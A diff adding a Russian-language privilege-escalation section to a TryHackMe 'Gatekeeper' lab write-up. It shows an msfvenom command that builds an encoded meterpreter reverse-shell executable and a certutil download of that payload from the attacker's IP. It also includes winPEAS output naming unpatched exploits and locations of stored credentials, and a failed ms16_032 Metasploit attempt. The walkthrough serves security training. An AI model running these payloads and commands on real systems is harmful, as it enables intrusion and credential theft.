@@ -694,11 +694,161 @@ The buffer overflow in this room is credited to Justin Steven and his
 C:\Users\natbat\Desktop>
 ```
 
-
-
 ## ⚙️ Привилегии
 
+Генерирую оболочку `meterpreter`, запускаю сервер
+```bash
+┌──(.venv)─(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Gatekeeper/exploits]
+└─$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.21.104.16 LPORT=5555 -f exe -o meter-5555.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 381 (iteration=0)
+x86/shikata_ga_nai chosen with final size 381
+Payload size: 381 bytes
+Final size of exe file: 73802 bytes
+Saved as: meter-5555.exe
+```
 
+Запускаю `multi/handler`
+```bash
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.21.104.16:5555
+```
+
+Загружаю на жертву `meter-5555.exe`
+```ps
+C:\Users\natbat\Downloads>certutil -urlcache -f http://10.21.104.16:8888/meter-5555.exe meter-5555.exe
+certutil -urlcache -f http://10.21.104.16:8888/meter-5555.exe meter-5555.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+
+C:\Users\natbat\Downloads>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 3ABE-D44B
+
+ Directory of C:\Users\natbat\Downloads
+
+07/24/2025  11:38 AM    <DIR>          .
+07/24/2025  11:38 AM    <DIR>          ..
+07/24/2025  11:38 AM            73,802 meter-5555.exe
+               1 File(s)         73,802 bytes
+               2 Dir(s)  15,754,280,960 bytes free
+
+C:\Users\natbat\Downloads>
+```
+
+Получаю оболочку `meterpreter`
+```bash
+meterpreter > sysinfo
+Computer        : GATEKEEPER
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x86/windows
+meterpreter >
+```
+
+Загрузил `winpeas`
+```ps
+certutil -urlcache -f http://10.21.104.16:8888/winPEAS.bat winpeas.bat
+```
+
+Рекомендуемые эксплоиты
+```ps
+"Microsoft Windows 7 Professional   "                                                                              
+   [i] Possible exploits (https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat)                  
+MS11-080 patch is NOT installed XP/SP3,2K3/SP3-afd.sys)                                                            
+MS16-032 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-secondary logon)                                         
+MS11-011 patch is NOT installed XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP1/2,7/SP0-WmiTraceMessageVa)                      
+MS10-59 patch is NOT installed 2K8,Vista,7/SP0-Chimichurri)                                                        
+MS10-21 patch is NOT installed 2K/SP4,XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP0/1/2,7/SP0-Win Kernel)                     
+MS10-092 patch is NOT installed 2K8/SP0/1/2,Vista/SP1/2,7/SP0-Task Sched)                                          
+MS10-073 patch is NOT installed XP/SP2/3,2K3/SP2/2K8/SP2,Vista/SP1/2,7/SP0-Keyboard Layout)                        
+MS17-017 patch is NOT installed 2K8/SP2,Vista/SP2,7/SP1-Registry Hive Loading)                                     
+MS10-015 patch is NOT installed 2K,XP,2K3,2K8,Vista,7-User Mode to Ring)                                           
+MS08-025 patch is NOT installed 2K/SP4,XP/SP2,2K3/SP1/2,2K8/SP0,Vista/SP0/1-win32k.sys)                            
+MS06-049 patch is NOT installed 2K/SP4-ZwQuerySysInfo)                                                             
+MS06-030 patch is NOT installed 2K,XP/SP2-Mrxsmb.sys)                                                              
+MS05-055 patch is NOT installed 2K/SP4-APC Data-Free)                                                              
+MS05-018 patch is NOT installed 2K/SP3/4,XP/SP1/2-CSRSS)                                                           
+MS04-019 patch is NOT installed 2K/SP2/3/4-Utility Manager)                                                        
+MS04-011 patch is NOT installed 2K/SP2/3/4,XP/SP0/1-LSASS service BoF)                                             
+MS04-020 patch is NOT installed 2K/SP4-POSIX)                                                                      
+MS14-040 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-afd.sys Dangling Pointer)                          
+MS16-016 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-WebDAV to Address)                                       
+MS15-051 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-win32k.sys)                                        
+MS14-070 patch is NOT installed 2K3/SP2-TCP/IP)                                                                    
+MS13-005 patch is NOT installed Vista,7,8,2008,2008R2,2012,RT-hwnd_broadcast)                                      
+MS13-053 patch is NOT installed 7SP0/SP1_x86-schlamperei)                                                          
+MS13-081 patch is NOT installed 7SP0/SP1_x86-track_popup_menu)
+```
+
+```ps
+ [+] Files in registry that may contain credentials                                                                
+   [i] Searching specific files that may contains credentials.                                                     
+   [?] https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials                                                                                                 
+Looking inside HKCU\Software\ORL\WinVNC3\Password                                                                  
+Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password                                                
+Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon                                          
+    DefaultDomainName    REG_SZ                                                                                    
+    DefaultUserName    REG_SZ                                                                                      
+Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP                                                         
+Looking inside HKCU\Software\TightVNC\Server                                                                       
+Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions                                                            
+Looking inside HKCU\Software\OpenSSH\Agent\Keys                                                                    
+C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\places.sqlite                    
+C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\key4.db                          
+C:\Windows\Panther\unattend.xml                                                                                    
+C:\Windows\Panther\setupinfo                                                                                       
+C:\Windows\winsxs\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.1.7601.17514_none_6f0f7833cb71e18d\appcmd.exe                                                                                                        
+C:\Windows\winsxs\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.1.7601.17514_none_79642285ffd2a388\appcmd.exe
+```
+
+`ms16_032` не отработал
+```bash
+msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > options
+
+Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  1                yes       The session to run this module on
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.21.104.16     yes       The listen address (an interface may be specified)
+   LPORT     7777             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
+
+[*] Started reverse TCP handler on 10.21.104.16:7777 
+[+] Compressed size: 1160
+[-] Exploit aborted due to failure: not-vulnerable: Target is not vulnerable
+[+] Deleted 
+[*] Exploit completed, but no session was created.
+msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > 
+
+```
 
 ## 🏁 Флаги
 
